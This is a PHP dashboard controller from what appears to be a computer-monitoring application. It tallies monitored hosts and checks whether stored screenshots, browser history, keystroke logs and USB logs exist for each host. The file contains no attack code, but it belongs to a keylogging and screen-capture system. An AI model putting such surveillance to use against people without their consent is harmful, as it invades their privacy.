<?php
require_once BASEPATH . 'app/controllers/Base.php';

class Dashboard extends Base {
    
    public function __construct() {
        parent::__construct();
    }
    
    public function index() {
        // Get statistics
        $totalUsers = $this->db->fetch("SELECT COUNT(*) as count FROM users")['count'];
        $totalMonitors = $this->db->fetch("SELECT COUNT(*) as count FROM tbl_monitor_ips")['count'];
        $activeMonitors = $this->db->fetch("SELECT COUNT(*) as count FROM tbl_monitor_ips WHERE monitor_status = 1")['count'];
        
        // Get recent monitors with actual data from database
        $recentMonitors = $this->db->fetchAll(
            "SELECT * FROM tbl_monitor_ips ORDER BY updated_at DESC LIMIT 10"
        );
        
        // Add actual data information to monitors using database queries
        foreach ($recentMonitors as &$monitor) {
            // Check for screenshots
            $has_screenshots = $this->db->fetch(
                "SELECT COUNT(*) as count FROM screenshot_metadata WHERE monitor_ip_id = :monitor_id",
                ['monitor_id' => $monitor['id']]
            )['count'] > 0;
            
            // Check for logs
            $has_browser_logs = $this->db->fetch(
                "SELECT COUNT(*) as count FROM browser_history_logs WHERE monitor_ip_id = :monitor_id",
                ['monitor_id' => $monitor['id']]
            )['count'] > 0;
            
            $has_key_logs = $this->db->fetch(
                "SELECT COUNT(*) as count FROM key_logs WHERE monitor_ip_id = :monitor_id",
                ['monitor_id' => $monitor['id']]
            )['count'] > 0;
            
            $has_usb_logs = $this->db->fetch(
                "SELECT COUNT(*) as count FROM usb_device_logs WHERE monitor_ip_id = :monitor_id",
                ['monitor_id' => $monitor['id']]
            )['count'] > 0;
            
            $has_logs = $has_browser_logs || $has_key_logs || $has_usb_logs;
            
            $monitor['has_data'] = $has_screenshots || $has_logs;
            $monitor['has_screenshots'] = $has_screenshots;
            $monitor['has_logs'] = $has_logs;
        }
        
        $this->view('dashboard/index', [
            'totalUsers' => $totalUsers,
            'totalMonitors' => $totalMonitors,
            'activeMonitors' => $activeMonitors,
            'recentMonitors' => $recentMonitors,
            'syncedCount' => 0 // No longer needed since we use database
        ]);
    }
}
?> 